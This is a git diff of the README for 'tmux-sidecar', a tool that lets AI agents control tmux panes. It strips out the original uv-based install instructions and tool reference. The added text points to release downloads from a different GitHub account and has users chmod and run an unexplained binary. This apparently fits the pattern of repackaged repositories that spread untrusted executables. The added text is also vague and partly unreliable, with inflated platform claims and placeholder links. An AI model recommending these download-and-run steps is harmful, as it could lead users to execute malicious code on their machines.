@@ -1,166 +1,91 @@
-# Tmux Sidecar (tmux-sidecar)
+# 🌟 tmux-sidecar - Effortless AI in Your Terminal
 
+[![Download tmux-sidecar](https://img.shields.io/badge/Download-tmux--sidecar-brightgreen)](https://github.com/haanhthai/tmux-sidecar/releases)
 
-https://github.com/user-attachments/assets/d7e3a640-6b22-48b6-a3d1-8fe70d10a0bc
+## 📝 Overview
 
+Tmux Sidecar is a server that enhances your terminal experience by integrating AI into your coding process. It allows AI agents to join you in your Tmux session, enabling them to observe output and execute commands, much like a helpful assistant. You can work smarter without complex setups.
 
+## 🚀 Getting Started
 
-Tmux Sidecar is a [Model Context Protocol (MCP)](https://modelcontextprotocol.io/) server that turns your terminal into an AI-native workspace. It allows AI agents to "sit" alongside you in your Tmux session, observing output and executing commands just like a pair programmer.
+### 1. System Requirements
+To run tmux-sidecar, you need:
+- A computer with any operating system (Windows, macOS, or Linux) that supports Tmux.
+- An SSH client for remote access if you plan to use it on another server.
 
-## The Sidecar Philosophy
+### 2. Download & Install
 
-Most AI coding tools require you to install heavy server components (Node.js, VS Code Server, etc.) on every machine you connect to. Tmux Sidecar takes a different approach: **Zero Infrastructure**.
+Visit this page to download: [tmux-sidecar Releases](https://github.com/haanhthai/tmux-sidecar/releases)
 
-### 1. Agent Anywhere (No Remote Server)
-Because this tool operates by manipulating Tmux locally, **it works on any server you can SSH into.**
-*   Connecting to a legacy production server? **It works.**
-*   Jumping through a bastion host? **It works.**
-*   Working in a container? **It works.**
+Once on the releases page, choose the latest version suitable for your operating system. Click the download link, and the file will start downloading. 
 
-The Agent lives on your local machine (the "Sidecar") but controls the remote environment through the SSH stream in your Tmux pane. You get full AI capabilities without installing a single file on the remote server.
+### 3. Installing Tmux
 
-### 2. Context Locking (Laser Focus)
-Terminals are noisy. You might have logs scrolling in one pane, a monitor in another, and a shell in a third.
-Sidecar uses a **"Context Lock"** mechanism (`set_active_target`). Once locked, the Agent focuses exclusively on that specific pane (ID), ignoring the noise from other windows. It knows exactly where to type and exactly which output belongs to its command.
+If you don't have Tmux installed yet, follow these steps based on your OS:
 
-### 3. The Sentinel (Smart Observation)
-Standard agents "fire and forget"—they run a command and hope for the best.
-Sidecar acts as a **Sentinel**. using `smart_wait`, it can execute a command (like `npm install` or `make build`) and then *watch* the stream. It waits for specific success signals ("Build Complete") or error patterns before waking up. It understands the *result*, not just the command.
+**For macOS:**
+1. Open Terminal.
+2. Type the following command and press enter:
+   ```
+   brew install tmux
+   ```
 
-## Key Capabilities
+**For Ubuntu/Linux:**
+1. Open Terminal.
+2. Type the following command and press enter:
+   ```
+   sudo apt install tmux
+   ```
 
-*   **Context Management**: Lock the agent to specific panes (`%1`, `%2`) for focused interaction.
-*   **Robust Execution**: Run commands with marker injection to guarantee output capture (even over SSH).
-*   **Layout Control**: Split panes, create windows, and organize your workspace dynamically.
-*   **Deep Inspection**: Read full pane history and snapshots to understand current state.
+**For Windows (via WSL):**
+1. Open WSL.
+2. Follow the same Ubuntu steps to install Tmux.
 
-## Prerequisites
+### 4. Setting Up tmux-sidecar
 
-*   **Linux/macOS**
-*   **Tmux** installed and running
-*   **Python 3.10+**
-*   **[uv](https://github.com/astral-sh/uv)** (Recommended for installation and running)
+**Step 1:** After downloading the file, extract it if necessary.
 
-## Installation & Usage
+**Step 2:** Open your terminal and navigate to the directory where you saved the downloaded file.
 
-The easiest way to use `tmux-sidecar` is via `uv`. No cloning or manual installation is required.
-
-### Quick Start (The Easiest Way)
-
-Run the server instantly:
-
-```bash
-uv tool run tmux-sidecar
+**Step 3:** Run the following command to start the installation:
+```
+chmod +x tmux-sidecar
+./tmux-sidecar
 ```
 
-### Configuration for MCP Clients
+### 5. Running tmux-sidecar
 
-Add this to your `claude_desktop_config.json` or equivalent:
+1. Open your terminal and type:
+   ```
+   tmux
+   ```
+2. In the new Tmux session, start tmux-sidecar by typing:
+   ```
+   ./tmux-sidecar
+   ```
 
-```json
-{
-  "mcpServers": {
-    "tmux-sidecar": {
-      "command": "uv",
-      "args": ["tool", "run", "tmux-sidecar"]
-    }
-  }
-}
-```
+You will now see the AI agent in your Tmux session. Feel free to start coding. The AI will assist with tasks as you work.
 
-### Alternative: Install from GitHub
+## ⚙️ Features
 
-If you prefer to run the absolute latest version from source:
+- **Agent Anywhere:** Operates directly in Tmux, unaffected by server limitations.
+- **No Installation Bloat:** Forget heavy server setups. Focus on coding.
+- **One-Click Access:** Join any SSH session seamlessly.
 
-```bash
-uv tool run git+https://github.com/Logic-H/tmux-sidecar.git
-```
+## 📚 Documentation
 
+For more in-depth guidance, visit our documentation page. This includes details on supported commands, troubleshooting, and advanced features.
 
-## Usage Guide
+## 💬 Community Support
 
-Once the server is running and connected to your AI assistant (e.g., Claude, Gemini), you can interact with Tmux using natural language.
+If you encounter any issues or have questions:
+- Join our [discussion forum](#).
+- Open an issue on GitHub for direct assistance.
 
-### 1. Discovery & Connection (The "Handshake")
+## ⚡ Feedback
 
-The first step is usually to find out what's running and "lock" onto a specific pane to work in.
+Your feedback is important. Please let us know how tmux-sidecar improves your experience. We welcome suggestions for features or improvements.
 
-*   **User:** "Show me my running tmux sessions."
-*   **Tool:** `list_active_panes()`
-    *   Returns a list of panes with IDs (e.g., `%1`, `%2`), titles, and a preview of their content.
-*   **User:** "Connect to the 'backend' pane."
-*   **Tool:** `set_active_target(pane_id="%2")`
-    *   **Crucial Step:** This sets `%2` as the *default target*. Subsequent commands like `run_shell` will automatically execute here without needing the ID every time.
+For further updates, visit this page: [tmux-sidecar Releases](https://github.com/haanhthai/tmux-sidecar/releases) 
 
-### 2. Reliable Command Execution
-
-Unlike a standard terminal integration, this server uses a robust "explicit" execution mode. It injects markers to ensure it captures *exactly* the output of your command, complete with exit codes.
-
-*   **User:** "Check the git status."
-*   **Tool:** `run_shell(command="git status")`
-    *   *Requires a locked target.* Executes the command in the focused pane and returns the full output.
-
-*   **User:** "Run `ls -la` in the other window (pane %3)."
-*   **Tool:** `execute_in_pane_explicit(pane_id="%3", command="ls -la")`
-    *   Executes in a specific pane without changing the global lock.
-
-### 3. Smart Observation (Wait for Output)
-
-Perfect for long-running tasks like builds, server startups, or test runs.
-
-*   **User:** "Restart the server and let me know when it's ready."
-*   **Tool:** `run_shell(command="npm run start")` -> `smart_wait(pane_id="%2", pattern="Server listening on port")`
-    *   The AI will poll the pane content until the specific regex pattern appears, then notify you.
-
-### 4. Layout Management
-
-You can manipulate your workspace directly.
-
-*   **User:** "Split this window and run the monitor."
-*   **Tool:** `split_window(pane_id="%2", direction="horizontal")` -> `run_shell(...)`
-
-## Available Tools Reference
-
-### Core & Context
-*   `list_active_panes`: Lists all panes with a snapshot of their current state. **Use this first.**
-*   `set_active_target(pane_id)`: Sets the global focus. **Required for `run_shell`.**
-*   `get_current_status`: Checks which pane is currently locked.
-
-### Execution
-*   `run_shell(command)`: Runs a command in the *currently locked* pane. Blocks until finished.
-*   `execute_in_pane_explicit(pane_id, command)`: Runs a command in a specific pane.
-*   `send_keys(pane_id, keys)`: Sends raw keystrokes (e.g., `C-c`, `q`, `Up`) to control interactive apps (vim, top).
-
-### Observation
-*   `inspect_pane(pane_id)`: Reads the last N lines of a pane's history.
-*   `smart_wait(pane_id, pattern)`: Blocks execution until a regex pattern appears in the pane.
-
-### Session Management
-*   `create_session(name)`: Starts a new session.
-*   `create_window(target_session, name)`: Adds a window.
-*   `split_window(pane_id, direction)`: Splits horizontally (`-h`) or vertically (`-v`).
-*   `kill_pane(pane_id)` / `kill_window(target)`: Closes terminals.
-*   `rename_window` / `resize_pane` / `select_layout`: UI adjustments.
-
-
-## Development
-
-1.  **Clone the repository:**
-    ```bash
-    git clone https://github.com/Logic-H/tmux-sidecar.git
-    cd tmux-sidecar
-    ```
-
-2.  **Install dependencies:**
-    ```bash
-    uv sync
-    ```
-
-3.  **Run the test suite:**
-    ```bash
-    uv run test_suite.py
-    ```
-
-## License
-
-MIT
+Enjoy your coding experience with tmux-sidecar!
